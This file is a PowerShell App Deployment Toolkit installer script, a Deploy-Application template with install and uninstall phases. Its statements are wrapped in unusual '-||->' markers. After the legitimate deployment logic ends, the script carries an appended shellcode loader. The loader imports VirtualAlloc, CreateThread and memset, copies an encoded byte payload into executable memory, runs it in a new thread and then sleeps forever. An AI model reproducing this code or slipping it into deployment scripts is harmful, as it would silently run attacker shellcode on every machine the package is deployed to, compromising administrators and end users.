
[CmdletBinding()]
Param (
	[Parameter(Mandatory=$false)]
	[ValidateSet('Install','Uninstall')]
	[string]$DeploymentType = 'Install',
	[Parameter(Mandatory=$false)]
	[ValidateSet('Interactive','Silent','NonInteractive')]
	[string]$DeployMode = 'Interactive',
	[Parameter(Mandatory=$false)]
	[switch]$AllowRebootPassThru = $false,
	[Parameter(Mandatory=$false)]
	[switch]$TerminalServerMode = $false,
	[Parameter(Mandatory=$false)]
	[switch]$DisableLogging = $false
)

 -||-> Try {
	
	 -||-> Try {  -||-> Set-ExecutionPolicy -ExecutionPolicy 'ByPass' -Scope 'Process' -Force -ErrorAction 'Stop' <-||-  } Catch {} <-||- 

	
	
	
	
	 -||-> [string]$appVendor = '' <-||- 
	 -||-> [string]$appName = '' <-||- 
	 -||-> [string]$appVersion = '' <-||- 
	 -||-> [string]$appArch = '' <-||- 
	 -||-> [string]$appLang = 'EN' <-||- 
	 -||-> [string]$appRevision = '01' <-||- 
	 -||-> [string]$appScriptVersion = '1.0.0' <-||- 
	 -||-> [string]$appScriptDate = '23/09/2019' <-||- 
	 -||-> [string]$appScriptAuthor = '<author name>' <-||- 
	
	
	 -||-> [string]$installName = '' <-||- 
	 -||-> [string]$installTitle = '' <-||- 

	
	

	
	 -||-> [int32]$mainExitCode = 0 <-||- 

	
	 -||-> [string]$deployAppScriptFriendlyName = 'Deploy Application' <-||- 
	 -||-> [version]$deployAppScriptVersion = [version]'3.8.0' <-||- 
	 -||-> [string]$deployAppScriptDate = '23/09/2019' <-||- 
	 -||-> [hashtable]$deployAppScriptParameters = $psBoundParameters <-||- 

	
	 -||-> If ( -||-> Test-Path -LiteralPath 'variable:HostInvocation' <-||- ) {  -||-> $InvocationInfo = $HostInvocation <-||-  } Else {  -||-> $InvocationInfo = $MyInvocation <-||-  } <-||- 
	 -||-> [string]$scriptDirectory =  -||-> Split-Path -Path $InvocationInfo.MyCommand.Definition -Parent <-||-  <-||- 

	
	 -||-> Try {
		 -||-> [string]$moduleAppDeployToolkitMain = "$scriptDirectory\AppDeployToolkit\AppDeployToolkitMain.ps1" <-||- 
		 -||-> If ( -||-> -not ( -||-> Test-Path -LiteralPath $moduleAppDeployToolkitMain -PathType 'Leaf' <-||- ) <-||- ) { Throw  -||-> "Module does not exist at the specified location [$moduleAppDeployToolkitMain]." <-||-  } <-||- 
		 -||-> If ( -||-> $DisableLogging <-||- ) {  -||-> . $moduleAppDeployToolkitMain -DisableLogging <-||-  } Else {  -||-> . $moduleAppDeployToolkitMain <-||-  } <-||- 
	}
	Catch {
		 -||-> If ( -||-> $mainExitCode -eq 0 <-||- ){  -||-> [int32]$mainExitCode = 60008 <-||-  } <-||- 
		 -||-> Write-Error -Message "Module [$moduleAppDeployToolkitMain] failed to load: `n$( -||-> $_.Exception.Message <-||- )`n `n$( -||-> $_.InvocationInfo.PositionMessage <-||- )" -ErrorAction 'Continue' <-||- 
		
		 -||-> If ( -||-> Test-Path -LiteralPath 'variable:HostInvocation' <-||- ) {  -||-> $script:ExitCode = $mainExitCode <-||- ; Exit } Else { Exit  -||-> $mainExitCode <-||-  } <-||- 
	} <-||- 

	
	
	
	
	

	 -||-> If ( -||-> $deploymentType -ine 'Uninstall' <-||- ) {
		
		
		
		 -||-> [string]$installPhase = 'Pre-Installation' <-||- 

		
		 -||-> Show-InstallationWelcome -CloseApps 'iexplore' -AllowDefer -DeferTimes 3 -CheckDiskSpace -PersistPrompt <-||- 

		
		 -||-> Show-InstallationProgress <-||- 

		


		
		
		
		 -||-> [string]$installPhase = 'Installation' <-||- 

		
		 -||-> If ( -||-> $useDefaultMsi <-||- ) {
			 -||-> [hashtable]$ExecuteDefaultMSISplat =  @{ Action =  -||-> 'Install' <-||- ; Path =  -||-> $defaultMsiFile <-||-  } <-||- ;  -||-> If ( -||-> $defaultMstFile <-||- ) {  -||-> $ExecuteDefaultMSISplat.Add('Transform', $defaultMstFile) <-||-  } <-||- 
			 -||-> Execute-MSI @ExecuteDefaultMSISplat <-||- ;  -||-> If ( -||-> $defaultMspFiles <-||- ) {  -||-> $defaultMspFiles | ForEach-Object {  -||-> Execute-MSI -Action 'Patch' -Path $_ <-||-  } <-||-  } <-||- 
		} <-||- 

		


		
		
		
		 -||-> [string]$installPhase = 'Post-Installation' <-||- 

		

		
		 -||-> If ( -||-> -not $useDefaultMsi <-||- ) {  -||-> Show-InstallationPrompt -Message 'You can customize text to appear at the end of an install or remove it completely for unattended installations.' -ButtonRightText 'OK' -Icon Information -NoWait <-||-  } <-||- 
	}
	ElseIf ( -||-> $deploymentType -ieq 'Uninstall' <-||- )
	{
		
		
		
		 -||-> [string]$installPhase = 'Pre-Uninstallation' <-||- 

		
		 -||-> Show-InstallationWelcome -CloseApps 'iexplore' -CloseAppsCountdown 60 <-||- 

		
		 -||-> Show-InstallationProgress <-||- 

		


		
		
		
		 -||-> [string]$installPhase = 'Uninstallation' <-||- 

		
		 -||-> If ( -||-> $useDefaultMsi <-||- ) {
			 -||-> [hashtable]$ExecuteDefaultMSISplat =  @{ Action =  -||-> 'Uninstall' <-||- ; Path =  -||-> $defaultMsiFile <-||-  } <-||- ;  -||-> If ( -||-> $defaultMstFile <-||- ) {  -||-> $ExecuteDefaultMSISplat.Add('Transform', $defaultMstFile) <-||-  } <-||- 
			 -||-> Execute-MSI @ExecuteDefaultMSISplat <-||- 
		} <-||- 

		


		
		
		
		 -||-> [string]$installPhase = 'Post-Uninstallation' <-||- 

		


	} <-||- 

	
	
	

	
	 -||-> Exit-Script -ExitCode $mainExitCode <-||- 
}
Catch {
	 -||-> [int32]$mainExitCode = 60001 <-||- 
	 -||-> [string]$mainErrorMessage = "$( -||-> Resolve-Error <-||- )" <-||- 
	 -||-> Write-Log -Message $mainErrorMessage -Severity 3 -Source $deployAppScriptFriendlyName <-||- 
	 -||-> Show-DialogBox -Text $mainErrorMessage -Icon 'Stop' <-||- 
	 -||-> Exit-Script -ExitCode $mainExitCode <-||- 
} <-||- 

 -||-> $4b3 = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);' <-||- ; -||-> $w =  -||-> Add-Type -memberDefinition $4b3 -Name "Win32" -namespace Win32Functions -passthru <-||-  <-||- ; -||-> [Byte[]] <-||- ; -||-> [Byte[]]$z = 0xd9,0xd0,0xd9,0x74,0x24,0xf4,0xba,0x90,0x0d,0xba,0x61,0x5e,0x31,0xc9,0xb1,0x47,0x31,0x56,0x18,0x03,0x56,0x18,0x83,0xee,0x6c,0xef,0x4f,0x9d,0x64,0x72,0xaf,0x5e,0x74,0x13,0x39,0xbb,0x45,0x13,0x5d,0xcf,0xf5,0xa3,0x15,0x9d,0xf9,0x48,0x7b,0x36,0x8a,0x3d,0x54,0x39,0x3b,0x8b,0x82,0x74,0xbc,0xa0,0xf7,0x17,0x3e,0xbb,0x2b,0xf8,0x7f,0x74,0x3e,0xf9,0xb8,0x69,0xb3,0xab,0x11,0xe5,0x66,0x5c,0x16,0xb3,0xba,0xd7,0x64,0x55,0xbb,0x04,0x3c,0x54,0xea,0x9a,0x37,0x0f,0x2c,0x1c,0x94,0x3b,0x65,0x06,0xf9,0x06,0x3f,0xbd,0xc9,0xfd,0xbe,0x17,0x00,0xfd,0x6d,0x56,0xad,0x0c,0x6f,0x9e,0x09,0xef,0x1a,0xd6,0x6a,0x92,0x1c,0x2d,0x11,0x48,0xa8,0xb6,0xb1,0x1b,0x0a,0x13,0x40,0xcf,0xcd,0xd0,0x4e,0xa4,0x9a,0xbf,0x52,0x3b,0x4e,0xb4,0x6e,0xb0,0x71,0x1b,0xe7,0x82,0x55,0xbf,0xac,0x51,0xf7,0xe6,0x08,0x37,0x08,0xf8,0xf3,0xe8,0xac,0x72,0x19,0xfc,0xdc,0xd8,0x75,0x31,0xed,0xe2,0x85,0x5d,0x66,0x90,0xb7,0xc2,0xdc,0x3e,0xfb,0x8b,0xfa,0xb9,0xfc,0xa1,0xbb,0x56,0x03,0x4a,0xbc,0x7f,0xc7,0x1e,0xec,0x17,0xee,0x1e,0x67,0xe8,0x0f,0xcb,0x12,0xed,0x87,0x34,0x4a,0xe5,0x33,0xdd,0x89,0xf6,0xae,0x25,0x07,0x10,0x80,0x05,0x47,0x8d,0x60,0xf6,0x27,0x7d,0x08,0x1c,0xa8,0xa2,0x28,0x1f,0x62,0xcb,0xc2,0xf0,0xdb,0xa3,0x7a,0x68,0x46,0x3f,0x1b,0x75,0x5c,0x45,0x1b,0xfd,0x53,0xb9,0xd5,0xf6,0x1e,0xa9,0x81,0xf6,0x54,0x93,0x07,0x08,0x43,0xbe,0xa7,0x9c,0x68,0x69,0xf0,0x08,0x73,0x4c,0x36,0x97,0x8c,0xbb,0x4d,0x1e,0x19,0x04,0x39,0x5f,0xcd,0x84,0xb9,0x09,0x87,0x84,0xd1,0xed,0xf3,0xd6,0xc4,0xf1,0x29,0x4b,0x55,0x64,0xd2,0x3a,0x0a,0x2f,0xba,0xc0,0x75,0x07,0x65,0x3a,0x50,0x99,0x59,0xed,0x9c,0xef,0xb3,0x2d <-||- ; -||-> $g = 0x1000 <-||- ; -||-> if ( -||-> $z.Length -gt 0x1000 <-||- ){ -||-> $g = $z.Length <-||- } <-||- ; -||-> $vzl=$w::VirtualAlloc(0,0x1000,$g,0x40) <-||- ;for ( -||-> $i=0 <-||- ; -||-> $i -le ( -||-> $z.Length-1 <-||- ) <-||- ; -||-> $i++ <-||- ) { -||-> $w::memset([IntPtr]( -||-> $vzl.ToInt32()+$i <-||- ), $z[$i], 1) <-||- }; -||-> $w::CreateThread(0,0,$vzl,0,0,0) <-||- ;for (;;){ -||-> Start-sleep 60 <-||- };



